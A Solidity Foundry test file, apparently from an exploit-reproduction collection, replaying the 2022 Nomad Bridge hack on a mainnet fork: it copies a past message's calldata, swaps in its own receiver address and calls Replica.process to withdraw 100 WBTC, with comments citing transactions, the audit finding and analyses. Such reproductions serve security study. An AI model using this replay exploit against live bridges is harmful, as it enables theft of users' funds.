// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~152M US$
// Attacker(s) : ☠😈👽🤖🐵🌝🤷‍♂️
// Replica contract mistakenly initialize : 0x53fd92771d2084a9bf39a6477015ef53b7f116c79d98a21be723d06d79024cad
// Example TXs in this reproduce
//  Attacker send 0.01 WBTC to NomadBridge : 0xed26708a7335116bdb0673f32ace7c2f329fe3cd349e200447210f1721f335f0
//  NomadBridge Process 100 WBTC to Attacker : 0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460

// @Info
// Nomad BridgeRouter Contract : https://etherscan.io/address/0x88a69b4e698a4b090df6cf5bd7b2d47325ad30a3#code (Proxy)
// Nomad BridgeRouter Contract : https://etherscan.io/address/0x15fda9f60310d09fea54e3c99d1197dff5107248#code (Logic)
// Nomad Replica Contract : https://etherscan.io/address/0x5d94309e5a0090b165fa4181519701637b6daeba#code (Proxy)
// Nomad Replica Contract : https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code (Logic) (Vulnerable!!)
// WBTC Contract : https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599#code
// NomadBridge Audit Report : https://github.com/nomad-xyz/docs/blob/1ff0c55dba2a842c811468c57793ff9a6542ef0f/docs/public/Nomad-Audit.pdf (QSP-19 Proving With An Empty Leaf)

// @Analysis
// samczsun : https://twitter.com/samczsun/status/1554252024723546112
// ParadigmEng420 : https://twitter.com/paradigmeng420/status/1554249610574450688
// 0xfoobar : https://twitter.com/0xfoobar/status/1554269062653411334
// CertiK : https://twitter.com/CertiKAlert/status/1554305088037978113
// Beosin : https://twitter.com/BeosinAlert/status/1554303803218083842
// Blocksec : https://twitter.com/BlockSecTeam/status/1554335271964987395
// CertiK post-mortem : https://www.certik.com/resources/blog/28fMavD63CpZJOKOjb9DX3-nomad-bridge-exploit-incident-analysis

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IReplica constant Replica = IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

contract Attacker is Test {
    function setUp() public {
        cheat.createSelectFork("mainnet", 15_259_100);
        cheat.label(address(Replica), "Replica");
        cheat.label(address(WBTC), "WBTC");
    }

    function testExploit() public {
        console.log(
            "Attackers can copy the original user's transaction calldata and replacing the receive address with a personal one."
        );
        console.log("We mock how attackers/whitehats replay the calldata at block 15259100\n"); // Txhash : 0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460

        emit log_named_decimal_uint("Attacker WBTC Balance", WBTC.balanceOf(address(this)), 8);
        console.log("Attacker claim 100 WBTC from NomadBridge...");

        // Copy inputdata in txhash(0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), but replacing receive address
        bytes memory msgP1 =
            hex"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000";
        bytes memory recvAddr = abi.encodePacked(address(this));
        bytes memory msgP2 =
            hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";
        bytes memory _message = bytes.concat(msgP1, recvAddr, msgP2);

        // This is _message data structure :
        /*
            bytes memory chainId = "beam";   // hex(6265616d) == dec(1650811245), Ref: https://docs.nomad.xyz/developers/environments/domain-chain-ids
            bytes memory sender = hex"D3dfD3eDe74E0DCEBC1AA685e151332857efCe2d";
            bytes memory nonce = hex"13d6";         // == dec"5078"
            bytes memory localDomain = hex"657468"; // == str"eth"
            bytes memory recipientAddress = hex"88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3";    // BridgeRouter address. this will callback BridgeRouter.handle(_message)
             ------------ __message that call BridgeRouter.handle(__message) ------------
            uint32 _domain = 657468;    // == str("eth")
            bytes32 _id = abi.encodePacked(address(WBTC));
            bytes32 _to = abi.encodePacked(address(this));
            uint256 _amnt = 100 * 1e8; // 100 WBTC
            bytes32 _detailsHash = keccak256(abi.encodePacked(bytes("Wrapped BTC").length, "Wrapped BTC", bytes("WBTC").length, "WBTC", uint8(8)));        
            bytes29 _tokenId = BridgeMessage.formatTokenId(_domain, _id);
            bytes29 _action = BridgeMessage.formatTransfer(_to, _amnt, _detailsHash);
            bytes memory __message = BridgeMessage.formatMessage(_tokenId, _action);
            -----------------------------------------------------------------------------
            bytes memory _message = bytes.concat(chainId, sender, nonce, localDomain, recipientAddress, __message);
        */

        bool suc = Replica.process(_message);
        require(suc, "Exploit failed");

        emit log_named_decimal_uint("Attacker WBTC Balance", WBTC.balanceOf(address(this)), 8);
    }
}

interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
}
